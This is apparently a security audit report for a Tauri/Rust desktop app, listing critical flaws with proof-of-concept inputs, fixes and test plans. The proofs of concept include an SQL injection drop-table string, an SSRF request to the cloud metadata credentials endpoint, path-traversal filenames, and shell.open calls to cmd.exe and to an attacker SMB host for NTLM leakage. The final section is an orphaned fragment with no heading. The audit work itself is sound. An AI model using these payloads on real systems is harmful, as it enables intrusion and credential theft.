C1: SQLite Injection via format!() in folder_groups.rsCRITICAL
File: folder_groups.rs:75,84Fix Safety: SAFE

Description

All SQL queries with string parameters use format!() with only .replace("'", "''") escaping. While SQLite's only string escape is doubling quotes, this pattern is fragile — any future code change missing the replace creates instant injection. NUL bytes cause CString errors (DoS).

PoC

// folder_groups.rs:75
conn.execute(format!("INSERT INTO groups (name,...) VALUES ('{}',...)", name.replace("'","''"),...))
// XSS payload from compromised frontend:
invoke('cmd_create_group', { name: "test'); DROP TABLE groups;--" })

Fix

conn.execute("INSERT INTO groups (name, color_hex, display_order) VALUES (?, ?, ?)",
    &[&name, &color_hex, &(max_order+1)]).map_err(|e| e.to_string())?;

Blast Radius

Components: folder_groups.rs, nobuf_groups.db. User flows: folder group create/rename/delete. Break risk: Parameterized queries are drop-in replacement — no downstream changes needed.

Regression Test Plan

Existing tests: None for folder_groups. New test: Create group with name containing SQL injection payloads, verify DB integrity. Manual: Create group with quotes, semicolons, SQL keywords. Rollback: Revert to format!() — single file change.

C2: SSRF in cmd_upload_from_url — No URL/IP/Redirect ValidationCRITICAL
File: fs.rs:424-622Fix Safety: CAUTIOUS

Description

No URL scheme validation, no IP filtering (127.0.0.1, 169.254.169.254, 10.x, 192.168.x all allowed), ureq follows redirects to internal addresses, filename from Content-Disposition not sanitized (path traversal via ../), Content-Type check only rejects text/html (bypassable), no download size enforcement during streaming.

PoC

// Cloud metadata exfiltration:
invoke('cmd_upload_from_url', { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' })
// Filename path traversal:
// Content-Disposition: filename="../../../../tmp/evil.sh"

Fix

fn validate_url(url: &str) -> Result {
    let parsed = url::Url::parse(url)?;
    if parsed.scheme() != "http" && parsed.scheme() != "https" { return Err("Only HTTP(S)".into()); }
    let host = parsed.host_str().ok_or("No host")?;
    if let Ok(ip) = host.parse::() {
        if ip.is_loopback() || ip.is_private() || ip.is_link_local() || ip.is_unspecified() { return Err("Internal IP blocked".into()); }
    }
    Ok(parsed.to_string())
}
fn sanitise_filename(name: &str) -> String { Path::new(name).file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or("file".into()) }

Blast Radius

Components: fs.rs, remote upload feature. User flows: remote upload from URL. Break risk: URL validation may break legitimate LAN uploads — test with valid external URLs.

Regression Test Plan

Existing: None. New: Test with 127.0.0.1, 169.254.x, 10.x, valid external URL, redirect to internal. Manual: Upload from valid URL, attempt SSRF payloads. Rollback: Remove validate_url call.

C3: Missing Download Semaphore in api_routes.rsCRITICAL
File: api_routes.rs:363-371Fix Safety: SAFE

Description

REST API file download uses iter_download without download_semaphore or yield_now — the ONLY download path in the codebase that bypasses both. Triggers FLOOD_PREMIUM_WAIT on Telegram, killing ALL downloads (streaming + file) for 300+ seconds.

Fix

let chunk_result = {
    let _permit = state.download_semaphore.acquire().await.unwrap();
    throttle_api_calls(&state.rate_limiter).await;
    iter.next().await
};
tokio::task::yield_now().await;

Blast Radius

Components: api_routes.rs download endpoint. User flows: REST API file downloads. Break risk: None — same pattern used everywhere else in codebase.

Regression Test Plan

Existing: None. New: Verify API download + concurrent streaming don't trigger FLOOD_WAIT. Manual: Download via API while streaming video. Rollback: Remove semaphore lines.

C4: RAR extract_all Path Traversal — Arbitrary File Write via ListingCRITICAL
File: archive.rs:132-136Fix Safety: COMPLEX

Description

cmd_list_archive_contents for RAR calls extract_all which writes files using raw, unsanitized file.name from RAR headers. sanitise_entry_name is only applied to displayed names, not files written to disk. A malicious RAR with entry name ..\..\..\Windows\System32\evil.dll writes outside the extract directory. This is a zero-click exploit — merely viewing the archive triggers it.

Fix

Replace rar = "0.4" with unrar crate which supports list-only mode (header-only listing without extraction). This eliminates the extract-to-list antipattern entirely.

Blast Radius

Components: archive.rs, ArchiveViewerModal. User flows: viewing RAR archives. Break risk: Crate replacement changes API — requires refactoring archive listing code.

Regression Test Plan

Existing: None. New: Create RAR with path traversal entry names, verify no files written outside extract dir. Manual: View normal RAR, view malicious RAR. Rollback: Revert to rar 0.4 crate.

C5: shell:allow-open Unscoped — file://, smb://, NTLM Hash LeakCRITICAL
File: capabilities/default.json:11Fix Safety: SAFE

Description

shell:allow-open grants the webview ability to call shell.open() with any URI. No shell scope configured. Compromised webview can open file:// URLs (execute local programs), smb:// URLs (NTLM hash capture on Windows), or arbitrary phishing URLs.

PoC

// From compromised webview:
await window.__TAURI__.shell.open('file:///C:/Windows/System32/cmd.exe')
await window.__TAURI__.shell.open('smb://attacker.com/share') // NTLM leak

Fix

Add shell scope to tauri.conf.json restricting open to http:// and https:// URLs only. Or remove shell:allow-open and handle URL opening via custom Tauri command with protocol validation.

Blast Radius

Components: capabilities, shell plugin. User flows: opening external links. Break risk: Verify https:// links still open — test my.telegram.org link in AuthWizard.

Regression Test Plan

Existing: None. New: Test shell.open with file://, smb://, https:// — only https:// should succeed. Manual: Click external links in app. Rollback: Restore shell:allow-open.

C6: ffmpeg Auto-Download Without Checksum VerificationCRITICAL
File: sprite.rs:57-61Fix Safety: CAUTIOUS

Description

ffmpeg_sidecar::download::auto_download() downloads a pre-built ffmpeg binary from the internet with no checksum verification, no signature verification. MITM attacker or compromised GitHub release can serve malicious ffmpeg → RCE with app's privileges.

Fix

Bundle ffmpeg with the app (Tauri resources/sidecar) and remove auto_download. Or verify SHA-256 checksum after download against hardcoded per-platform hashes.

Blast Radius

Components: sprite.rs, all video preview/sprite features. User flows: any user without ffmpeg installed who triggers sprite generation. Break risk: Bundling ffmpeg changes build pipeline.

Regression Test Plan

Existing: None. New: Test ensure_ffmpeg finds bundled binary, never calls auto_download. Test checksum mismatch aborts. Manual: Delete sidecar ffmpeg, trigger sprite generation. Rollback: Restore auto_download call.

// Remove lines 118-124 entirely. Replace with:
throw new Error('mp4box module not available — ensure it is installed and bundled');

Blast Radius

Components: MP4Player.ts, video playback. User flows: MP4 video playback (fallback path). Break risk: None — primary import('mp4box') path (line 114) is the correct one.

Regression Test Plan

Existing: None. New: Verify import('mp4box') succeeds in dev and prod. Verify no network fetch attempted. Manual: Play MP4 video. Rollback: Restore CDN fallback.
